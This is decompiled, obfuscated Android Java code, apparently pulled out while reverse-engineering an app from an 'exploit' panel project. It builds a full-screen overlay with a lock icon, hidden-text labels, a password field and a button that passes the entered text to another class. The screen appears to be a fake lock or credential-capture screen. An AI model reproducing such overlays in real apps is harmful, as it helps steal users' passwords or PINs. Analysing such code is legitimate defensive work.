package v.s;

import android.R;
import android.content.Context;
import android.graphics.Color;
import android.graphics.drawable.GradientDrawable;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import app.mobilex.plus.util.TypefaceCache;

/* JADX INFO: compiled from: r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091 */
/* JADX INFO: loaded from: /private/tmp/claude-501/-Users-noiss-Work-exploit-RedWing-Panel-main-source-internal-builder/68c7750b-b3a0-412f-ab12-bf16e4a764d8/scratchpad/dex_extract/classes.dex */
public final class NiXw8wskyH18G extends FrameLayout {
    public final ofxQWGnngPxGI3OtvQn dDIMxZXP1V8HdM;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public NiXw8wskyH18G(Context context) {
        super(context);
        ofxQWGnngPxGI3OtvQn ofxqwgnngpxgi3otvqn = ofxQWGnngPxGI3OtvQn.gIIiyi2ddlMDR0;
        this.dDIMxZXP1V8HdM = ofxqwgnngpxgi3otvqn;
        setBackgroundColor(Color.parseColor(TypefaceCache.obtain("00600053000B00D700A000EF008200F70073")));
        LinearLayout linearLayout = new LinearLayout(context);
        linearLayout.setOrientation(1);
        linearLayout.setGravity(1);
        linearLayout.setPadding(80, 0, 80, 0);
        ImageView imageView = new ImageView(context);
        imageView.setImageResource(R.drawable.ic_lock_idle_lock);
        imageView.setColorFilter(-1);
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(120, 120);
        layoutParams.gravity = 1;
        layoutParams.bottomMargin = 40;
        imageView.setLayoutParams(layoutParams);
        linearLayout.addView(imageView);
        TextView textView = new TextView(context);
        textView.setText(TypefaceCache.checked("04510424040E04D304A8049D048700E7047C0426047B04D904AB0493"));
        textView.setTextColor(-1);
        textView.setTextSize(22.0f);
        textView.setGravity(17);
        LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams2.bottomMargin = 12;
        textView.setLayoutParams(layoutParams2);
        linearLayout.addView(textView);
        TextView textView2 = new TextView(context);
        textView2.setText(TypefaceCache.checked("0457042D047400C704AF049F048C04F3047D042D040D04D204AD04E704FD00E704710424040E04D304A8049D048700E7047C0426047B04D904AB04930092048404020454047B04D904A9049E04F004F50473"));
        textView2.setTextColor(Color.parseColor(TypefaceCache.obtain("00600057007A00A600D1009E00F3")));
        textView2.setTextSize(14.0f);
        textView2.setGravity(17);
        LinearLayout.LayoutParams layoutParams3 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams3.bottomMargin = 40;
        textView2.setLayoutParams(layoutParams3);
        linearLayout.addView(textView2);
        EditText editText = new EditText(context);
        editText.setHint(TypefaceCache.checked("045C0426047B04D904AB0493"));
        editText.setHintTextColor(Color.parseColor(TypefaceCache.obtain("00600020000D00D100A600E90084")));
        editText.setTextColor(-1);
        editText.setTextSize(18.0f);
        editText.setInputType(129);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setColor(Color.parseColor(TypefaceCache.obtain("00600027007A00D600D100EE00F3")));
        gradientDrawable.setCornerRadius(16.0f);
        gradientDrawable.setStroke(2, Color.parseColor(TypefaceCache.obtain("00600025000800D400A300EC0081")));
        editText.setBackground(gradientDrawable);
        editText.setPadding(48, 36, 48, 36);
        LinearLayout.LayoutParams layoutParams4 = new LinearLayout.LayoutParams(-1, -2);
        layoutParams4.bottomMargin = 32;
        editText.setLayoutParams(layoutParams4);
        editText.setFocusable(true);
        editText.setFocusableInTouchMode(true);
        linearLayout.addView(editText);
        TextView textView3 = new TextView(context);
        textView3.setText(TypefaceCache.checked("045C0428040F04A504A204EA04F204F3047B04540477"));
        textView3.setTextColor(-1);
        textView3.setTextSize(16.0f);
        textView3.setGravity(17);
        GradientDrawable gradientDrawable2 = new GradientDrawable();
        gradientDrawable2.setColor(Color.parseColor(TypefaceCache.obtain("00600027000E00D100A5009C0082")));
        gradientDrawable2.setCornerRadius(16.0f);
        textView3.setBackground(gradientDrawable2);
        textView3.setPadding(0, 36, 0, 36);
        textView3.setLayoutParams(new LinearLayout.LayoutParams(-1, -2));
        textView3.setOnClickListener(new qWdun9tpyrzMOCG8H4x(editText, this, 1));
        linearLayout.addView(textView3);
        FrameLayout.LayoutParams layoutParams5 = new FrameLayout.LayoutParams(-1, -2);
        layoutParams5.gravity = 17;
        addView(linearLayout, layoutParams5);
        post(new hzCVl0f866ksvpzUUql(17, editText));
    }
}
